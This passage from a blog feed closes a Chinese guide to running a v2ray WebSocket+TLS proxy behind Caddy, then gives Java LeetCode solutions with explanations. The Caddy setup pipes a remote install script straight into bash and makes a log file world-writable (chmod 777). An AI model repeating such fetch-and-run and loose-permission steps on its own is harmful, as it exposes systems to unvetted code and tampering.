<span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;freedom&quot;</span>,</span><br><span class="line"><span class="attr">&quot;settings&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="安装caddy"><a class="markdownIt-Anchor" href="#安装caddy"></a> 安装Caddy</h1><h2 id="配置域名"><a class="markdownIt-Anchor" href="#配置域名"></a> 配置域名</h2><p>  在Caddy启动前，首先需将域名指向服务器，否则会在Caddy启动后由于域名无法访问导致无法申请HTTPS证书，而且在出错后会被CD数小时，导致服务器不能正常使用。</p><h2 id="安装caddy-2"><a class="markdownIt-Anchor" href="#安装caddy-2"></a> 安装Caddy</h2><p>  一键安装脚本。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://getcaddy.com | bash -s personal</span><br></pre></td></tr></table></figure><h2 id="创建相关目录"><a class="markdownIt-Anchor" href="#创建相关目录"></a> 创建相关目录</h2><p>  设置Caddy目录。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /etc/caddy</span><br><span class="line">touch /etc/caddy/Caddyfile</span><br><span class="line">chown -R root:www-data /etc/caddy</span><br></pre></td></tr></table></figure><p>  除了配置文件，caddy 会自动生成 ssl 证书，需要一个文件夹放置 ssl 证书。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /etc/ssl/caddy</span><br><span class="line">chown -R www-data:root /etc/ssl/caddy</span><br><span class="line">chmod 0770 /etc/ssl/caddy</span><br></pre></td></tr></table></figure><p>  因为 ssl 文件夹里会放置私钥，所以权限设置成 770 禁止其他用户访问。</p><p>  这里需要注意一点的是，因为caddy.service中默认的进程运行用户和用户组为<code>www-data</code>，所以日志文件也需要让www-data用户能够有权限读写，当然你也可以选择将日志文件存放在配置文件目录中。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /var/<span class="built_in">log</span>/caddy</span><br><span class="line">touch /var/<span class="built_in">log</span>/caddy/caddy.log</span><br><span class="line">chown -R root:www-data /var/<span class="built_in">log</span>/caddy/</span><br><span class="line">chmod 777 /var/<span class="built_in">log</span>/caddy/caddy.log</span><br></pre></td></tr></table></figure><h3 id="修改systemd配置"><a class="markdownIt-Anchor" href="#修改systemd配置"></a> 修改systemd配置</h3><p>  下载systemd配置。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s https://raw.githubusercontent.com/mholt/caddy/master/dist/init/linux-systemd/caddy.service -o /etc/systemd/system/caddy.service <span class="comment"># 从 github 下载 systemd 配置文件 </span></span><br><span class="line">sudo systemctl daemon-reload <span class="comment"># 重新加载 systemd 配置</span></span><br></pre></td></tr></table></figure><p>  将<code>/etc/systemd/system/caddy.service</code>文件中以下三项配置选项的注释符<code>#</code>删除，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CapabilityBoundingSet=CAP_NET_BIND_SERVICE</span><br><span class="line">AmbientCapabilities=CAP_NET_BIND_SERVICE</span><br><span class="line">NoNewPrivileges=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="修改caddyfile"><a class="markdownIt-Anchor" href="#修改caddyfile"></a> 修改CaddyFile</h3><p>  修改<code>/etc/caddy/Caddyfile</code>。</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">ray.mydomain.me #你的站点域名</span><br><span class="line">&#123;</span><br><span class="line">  log /var/log/caddy/caddy.log</span><br><span class="line">  tls test@csds.xxx</span><br><span class="line">  proxy /v2ray localhost:1028 &#123; #注意这里需要与v2ray中配置的监听端口及WebSocket所使用的HTTP协议路径一致</span><br><span class="line">    websocket</span><br><span class="line">    header_upstream -Origin</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="启动各项服务"><a class="markdownIt-Anchor" href="#启动各项服务"></a> 启动各项服务</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> caddy.service</span><br><span class="line">systemctl status caddy.service</span><br><span class="line">systemctl start caddy</span><br><span class="line">systemctl status caddy</span><br><span class="line">systemctl start v2ray</span><br><span class="line">systemctl status v2ray</span><br></pre></td></tr></table></figure><h1 id="客户端配置"><a class="markdownIt-Anchor" href="#客户端配置"></a> 客户端配置</h1><p>  地址为域名，端口为443，传输协议选择ws，并填写path，底层传输安全选择tls即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  参考  &lt;a href=&quot;https://www.conum.cn/share/191.html&quot;&gt;基于v2ray的websocket+tls+web实现安全网络代理&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;v2ray安装&quot;&gt;&lt;a class=&quot;markdownIt-Ancho</summary>
      
    
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>CYC推荐LeetCode试题题解与总结</title>
    <link href="https://coder.lufer.cc/%E9%A2%98%E8%A7%A3/CYC%E6%8E%A8%E8%8D%90LeetCode%E8%AF%95%E9%A2%98%E9%A2%98%E8%A7%A3%E4%B8%8E%E6%80%BB%E7%BB%93/"/>
    <id>https://coder.lufer.cc/%E9%A2%98%E8%A7%A3/CYC%E6%8E%A8%E8%8D%90LeetCode%E8%AF%95%E9%A2%98%E9%A2%98%E8%A7%A3%E4%B8%8E%E6%80%BB%E7%BB%93/</id>
    <published>2019-08-12T11:38:54.000Z</published>
    <updated>2021-04-06T02:18:21.387Z</updated>
    
    <content type="html"><![CDATA[<p>  本篇文章主要记录来自CYC所推荐的200+LeetCode经典题目解题思路与题解。</p><p>  <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E7%9B%AE%E5%BD%95.md">https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode 题解 - 目录.md</a></p><h1 id="第一部分-算法思想"><a class="markdownIt-Anchor" href="#第一部分-算法思想"></a> 第一部分 算法思想</h1><h2 id="一-双指针"><a class="markdownIt-Anchor" href="#一-双指针"></a> 一、双指针</h2><h3 id="1-有序数组的-two-sum"><a class="markdownIt-Anchor" href="#1-有序数组的-two-sum"></a> 1. 有序数组的 Two Sum</h3><p>  <a href="https://leetcode-cn.com/problems/two-sum-ii-input-array-is-sorted/">https://leetcode-cn.com/problems/two-sum-ii-input-array-is-sorted/</a></p><h4 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h4><p>  因为数组是有序的，所以用双指针首尾想加，结果偏大则尾部向前移动，结果偏小则头部向后移动。</p><h4 id="代码"><a class="markdownIt-Anchor" href="#代码"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] numbers, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] res=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=numbers.length-<span class="number">1</span>;i&lt;j;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> temp=numbers[i]+numbers[j];</span><br><span class="line">            <span class="keyword">if</span>(temp==target)</span><br><span class="line">            &#123;</span><br><span class="line">                res[<span class="number">0</span>]=i+<span class="number">1</span>;</span><br><span class="line">                res[<span class="number">1</span>]=j+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span>(temp&lt;target)</span><br><span class="line">                    i++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2两数平方和"><a class="markdownIt-Anchor" href="#2两数平方和"></a> 2.两数平方和</h3><p>  <a href="https://leetcode-cn.com/problems/sum-of-square-numbers/">https://leetcode-cn.com/problems/sum-of-square-numbers/</a></p><h4 id="思路-2"><a class="markdownIt-Anchor" href="#思路-2"></a> 思路</h4><p>  如果一个数可以被两个数的平方和表示，那么这两个数一定都小于这个数的平方根，故可先求平方根，然后同样双指针前后夹逼。</p><h4 id="代码-2"><a class="markdownIt-Anchor" href="#代码-2"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">judgeSquareSum</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right=(<span class="keyword">int</span>)Math.sqrt(c);</span><br><span class="line">        <span class="keyword">for</span>(;left&lt;=right;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> temp=left*left+right*right;</span><br><span class="line">            <span class="keyword">if</span>(temp==c)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span>(temp&gt;c)</span><br><span class="line">                    right--;</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3反转字符串中的元音字符"><a class="markdownIt-Anchor" href="#3反转字符串中的元音字符"></a> 3.反转字符串中的元音字符</h3><p>  <a href="https://leetcode-cn.com/problems/reverse-vowels-of-a-string/submissions/">https://leetcode-cn.com/problems/reverse-vowels-of-a-string/submissions/</a></p><h4 id="思路-3"><a class="markdownIt-Anchor" href="#思路-3"></a> 思路</h4><p>  双指针前后寻找，找到元音后停止，当两个指针都停止时，交换字符，然后继续移动。</p><h4 id="代码-3"><a class="markdownIt-Anchor" href="#代码-3"></a> 代码</h4><p>  代码感觉写的比较繁琐，有待优化。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseVowels</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s!=<span class="keyword">null</span> &amp;&amp; s.length()!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span>[] ch=<span class="keyword">new</span> <span class="keyword">char</span>[s.length()];</span><br><span class="line">            String letter=<span class="string">&quot;aieouAIEOU&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=s.length()-<span class="number">1</span>;i&lt;=j;)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">char</span> left=s.charAt(i);</span><br><span class="line">                <span class="keyword">char</span> right=s.charAt(j);</span><br><span class="line">                <span class="keyword">int</span> flagleft=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">int</span> flagright=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span>(i==j)</span><br><span class="line">                &#123;</span><br><span class="line">                    ch[i]=left;</span><br><span class="line">                    i++;</span><br><span class="line">                    j--;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(letter.indexOf(left)==-<span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    ch[i]=left;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flagleft=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>((letter.indexOf(right)==-<span class="number">1</span>)&amp;&amp;(i&lt;j))</span><br><span class="line">                &#123;</span><br><span class="line">                    ch[j]=right;</span><br><span class="line">                    j--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flagright=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(flagleft==<span class="number">1</span>&amp;&amp;flagright==<span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    ch[i]=right;</span><br><span class="line">                    ch[j]=left;</span><br><span class="line">                    i++;</span><br><span class="line">                    j--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            s=String.valueOf(ch);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4验证回文字符串-ii"><a class="markdownIt-Anchor" href="#4验证回文字符串-ii"></a> 4.验证回文字符串 Ⅱ</h3><p>  <a href="https://leetcode-cn.com/problems/valid-palindrome-ii/">https://leetcode-cn.com/problems/valid-palindrome-ii/</a></p><h4 id="思路-4"><a class="markdownIt-Anchor" href="#思路-4"></a> 思路</h4><p>  前后指针同时移动，判断是否相等。当第一次判断不相等时，前后各移动一次通过子函数判断是否可行，如果依然构不成回文则返回false。</p><h4 id="代码-4"><a class="markdownIt-Anchor" href="#代码-4"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">validPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] chars = s.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = chars.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chars[i] != chars[j]) &#123;</span><br><span class="line">                <span class="keyword">return</span> validPalindrome(chars, i, j - <span class="number">1</span>) || validPalindrome(chars, i + <span class="number">1</span>, j);</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">validPalindrome</span><span class="params">(<span class="keyword">char</span>[] chars, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chars[l] != chars[r]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            l++;</span><br><span class="line">            r--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-归并两个有序数组"><a class="markdownIt-Anchor" href="#5-归并两个有序数组"></a> 5. 归并两个有序数组</h3><p>  <a href="https://leetcode-cn.com/problems/merge-sorted-array/">https://leetcode-cn.com/problems/merge-sorted-array/</a></p><h4 id="思路-5"><a class="markdownIt-Anchor" href="#思路-5"></a> 思路</h4><p>  本意是二路归并，但是本题需要在nums1上进行修改。<br />  因为两个数组全是有序的，而nums1数组空间足够，后部用0填充，则可以从最后的0开始向前填充，双指针对比nums1与nums2的队尾，取较大者进行填充。<br />  如果结束时nums1的指针未移动到头部，则前部的较小元素无需移动，已经有序，直接结束。<br />  如果nums2指针未移动到头部，说明nums1所有较大元素已经移好，只需将剩下元素复制过去即可。</p><h4 id="代码-5"><a class="markdownIt-Anchor" href="#代码-5"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span> m, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> p = m-- + n-- - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (m &gt;= <span class="number">0</span> &amp;&amp; n &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            nums1[p--] = nums1[m] &gt; nums2[n] ? nums1[m--] : nums2[n--];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (n &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            nums1[p--] = nums2[n--];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-判断链表是否存在环"><a class="markdownIt-Anchor" href="#6-判断链表是否存在环"></a> 6. 判断链表是否存在环</h3><p>  <a href="https://leetcode-cn.com/problems/linked-list-cycle/">https://leetcode-cn.com/problems/linked-list-cycle/</a></p><h4 id="思路-6"><a class="markdownIt-Anchor" href="#思路-6"></a> 思路</h4><p>  常用套路，快慢指针，慢指针位移1，快指针位移2，如果有环必会相遇。</p><p>  骚套路：</p><ol><li>用Set存ListNode，如果已经contains，则存在环</li><li>每次给Node的value设定一个特殊值，如果检测到，则存在环</li></ol><h4 id="代码-6"><a class="markdownIt-Anchor" href="#代码-6"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//快慢指针版</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode slow=head;</span><br><span class="line">        ListNode fast=head;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="keyword">null</span>&amp;&amp;fast.next!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            slow=slow.next;</span><br><span class="line">            fast=fast.next.next;</span><br><span class="line">            <span class="keyword">if</span>(slow==fast)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//别人写的骚套路，复制过来记一下</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        Set&lt;ListNode&gt;node = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(node.contains(head))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                node.add(head);</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-最长子序列"><a class="markdownIt-Anchor" href="#7-最长子序列"></a> 7. 最长子序列</h3><p>  <a href="https://leetcode-cn.com/problems/longest-word-in-dictionary-through-deleting/">https://leetcode-cn.com/problems/longest-word-in-dictionary-through-deleting/</a></p><h4 id="思路-7"><a class="markdownIt-Anchor" href="#思路-7"></a> 思路</h4><p>  对于字典里的每一个字符串，分别判断其是否是s的子串，然后找最长的返回。<br />  双指针分别指向s和字典需要判断的串。</p><h4 id="代码-7"><a class="markdownIt-Anchor" href="#代码-7"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findLongestWord</span><span class="params">(String s, List&lt;String&gt; d)</span> </span>&#123;</span><br><span class="line">        String res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;d.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            String temp=d.get(i);</span><br><span class="line">            <span class="keyword">if</span>(issubstring(s,temp))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(res.length()&lt;temp.length())</span><br><span class="line">                    res=temp;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">if</span>((temp.length()==res.length())&amp;&amp;(temp.compareTo(res)&lt;<span class="number">0</span>))</span><br><span class="line">                        res=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">issubstring</span><span class="params">(String s,String target)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(;i&lt;s.length()&amp;&amp;j&lt;target.length();)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i)==target.charAt(j))</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j==target.length())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二-排序"><a class="markdownIt-Anchor" href="#二-排序"></a> 二、排序</h2><h3 id="1数组中的第k个最大元素"><a class="markdownIt-Anchor" href="#1数组中的第k个最大元素"></a> 1.数组中的第K个最大元素</h3><p>  <a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array/">https://leetcode-cn.com/problems/kth-largest-element-in-an-array/</a></p><h4 id="思路-8"><a class="markdownIt-Anchor" href="#思路-8"></a> 思路</h4><p>  利用Java的PriorityQueue来实现小顶堆，然后维护堆大小为K，堆顶元素就是第K大的。</p><h4 id="代码-8"><a class="markdownIt-Anchor" href="#代码-8"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//时间复杂度 O(NlogK)，空间复杂度 O(K)。</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            pq.add(nums[i]);</span><br><span class="line">            <span class="keyword">if</span> (pq.size() &gt; k)</span><br><span class="line">                pq.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pq.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-出现频率最多的-k-个元素"><a class="markdownIt-Anchor" href="#2-出现频率最多的-k-个元素"></a> 2. 出现频率最多的 k 个元素</h3><p>  <a href="https://leetcode-cn.com/problems/top-k-frequent-elements/">https://leetcode-cn.com/problems/top-k-frequent-elements/</a></p><h4 id="思路-9"><a class="markdownIt-Anchor" href="#思路-9"></a> 思路</h4><p>  利用桶排序，每个桶存储每个元素的出现频率，然后维护一个小顶堆,手动实现comparator，通过获取频率来比较，就可以获得第K大,但是获取到的是反序的，再reverse一下。</p><h4 id="代码-9"><a class="markdownIt-Anchor" href="#代码-9"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">topKFrequent</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        Map&lt;Integer, Integer&gt; m = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            m.put(num, m.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;(<span class="keyword">new</span> Comparator&lt;Integer&gt;()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer a,Integer b)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> m.get(a)-m.get(b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> key : m.keySet()) &#123;</span><br><span class="line">            pq.add(key);</span><br><span class="line">            <span class="keyword">if</span>(pq.size()&gt;k)</span><br><span class="line">                pq.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; res=<span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            res.add(pq.remove());</span><br><span class="line">        &#125;</span><br><span class="line">        Collections.reverse(res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-按照字符出现次数对字符串排序"><a class="markdownIt-Anchor" href="#3-按照字符出现次数对字符串排序"></a> 3. 按照字符出现次数对字符串排序</h3><p>  <a href="https://leetcode-cn.com/problems/sort-characters-by-frequency/">https://leetcode-cn.com/problems/sort-characters-by-frequency/</a></p><h4 id="思路-10"><a class="markdownIt-Anchor" href="#思路-10"></a> 思路</h4><p>  用map统计频率，因为全部都需要，所以可以通过手动实现Comparator来维护一个大顶堆，然后遍历堆重复字符还原字符串。</p><h4 id="代码-10"><a class="markdownIt-Anchor" href="#代码-10"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">frequencySort</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        Map&lt;Character,Integer&gt; map=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> c=s.charAt(i);</span><br><span class="line">            map.put(c,map.getOrDefault(c,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        PriorityQueue&lt;Character&gt; pq=<span class="keyword">new</span> PriorityQueue&lt;Character&gt;(<span class="keyword">new</span> Comparator&lt;Character&gt;()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Character a,Character b)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> map.get(b)-map.get(a);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span>(Character key : map.keySet())</span><br><span class="line">        &#123;</span><br><span class="line">            pq.add(key);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span>[] res=<span class="keyword">new</span> <span class="keyword">char</span>[s.length()];</span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> ch=pq.remove();</span><br><span class="line">            <span class="keyword">int</span> times=map.get(ch);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;times;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                res[j++]=ch;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> String.valueOf(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-按颜色进行排序"><a class="markdownIt-Anchor" href="#4-按颜色进行排序"></a> 4. 按颜色进行排序</h3><p>  <a href="https://leetcode-cn.com/problems/sort-colors/submissions/">https://leetcode-cn.com/problems/sort-colors/submissions/</a></p><h4 id="思路-11"><a 